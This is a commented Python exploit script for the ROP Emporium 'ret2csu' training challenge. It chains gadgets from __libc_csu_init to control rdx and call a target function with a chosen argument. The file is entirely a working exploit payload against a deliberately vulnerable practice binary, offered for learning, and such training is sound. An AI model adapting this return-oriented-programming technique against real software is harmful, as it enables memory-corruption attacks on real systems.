#!/usr/bin/python

# created for the ROP Emporium challenge "ret2csu"
# involves finding gadgets in the __libc_csu_init function
# in order to control the rdx register when three arguments need to be passed
# and there aren't any gadgets for controlling rdx

import struct

# gadgets
ret2win = struct.pack("Q",0x00000000004007b1)
csu_pop = struct.pack("Q",0x0040089a) # pop rbx; pop rbp; pop r12; pop r13; pop 14; pop r15; ret;
mov_r15_rdx = struct.pack("Q",0x00400880) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
# the init address can be found with:
# x/5g &_DYNAMIC
# 0x600e20:	0x1	0x1
# 0x600e30:	0xc	0x400560
# 0x600e40:	0xd
# we want 0x600e30 + 0x8
init_address = struct.pack("Q",0x600e38) # address of __init function, safe to be called

# third argument for ret2win must be 0xdeadcafebabebeef
# offset at 40 bytes
payload = "A" * 40
# need one qword of junk for below gadget
# r15 should contain 0xdeadcafebabebeef, as that'll be moved to rdx
# r12 and rbx also need to be controlled for the call qword at the end
# of the mov gadget
payload += csu_pop
# set up call to end up at ret2win address
# set these to 1 and 2 to passs the cmp instruction after the second gadget
payload += struct.pack("Q",0x0) # rbx
payload += struct.pack("Q",0x1) # rbp
payload += init_address # r12; this address will get called; init is a safe function that won't SIGSEV
payload += "whatever"
payload += struct.pack("Q",0x2) # gets moved to rsi
payload += struct.pack("Q",0xdeadcafebabebeef) # r15

# this mov_r15_rdx gadget will eventually hit the original pop_csu gadget again,
# since it doesn't have a ret instruction
# therefore, junk will be needed to fill the registers on the second time through
# the gadget
payload += mov_r15_rdx
# one qword for add rsp instruction, 6 more for pop instructions
payload += struct.pack("Q",0x0) * 7
# chain over, call ret2win()
payload += ret2win

print payload
